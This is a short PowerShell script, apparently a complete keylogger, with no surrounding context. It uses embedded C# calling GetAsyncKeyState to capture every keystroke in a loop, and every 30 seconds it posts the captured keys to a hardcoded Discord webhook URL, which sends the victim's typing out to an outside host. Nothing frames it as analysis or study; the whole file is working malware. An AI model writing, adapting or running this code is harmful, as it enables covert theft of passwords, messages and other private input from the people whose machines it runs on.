Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int nVK);
}
"@

$webhook = "https://discord.com/api/webhooks/1493022024094978132/HhVUBZqXDKft3RKLmalLpVK2dvjfMzUkDsFRdVemkQ8f8G8S3ivkqLgYqY6S8nVOCSw_"
$log = ""
$lastSent = Get-Date

while ($true) {
    for ($i = 8; $i -le 255; $i++) {
        $state = [KeyLogger]::GetAsyncKeyState($i)
        if ($state -eq -32767) {
            $key = [System.Windows.Forms.Keys]$i
            $log += "$key"
        }
    }
    
    # Posielanie dát každých 30 sekúnd alebo pri zaplnení logu
    if ((Get-Date) -gt $lastSent.AddSeconds(30) -and $log.Length -gt 0) {
        $payload = @{ content = "Captured Keys: $log" }
        Invoke-RestMethod -Uri $webhook -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
        $log = ""
        $lastSent = Get-Date
    }
    Start-Sleep -Milliseconds 10
}
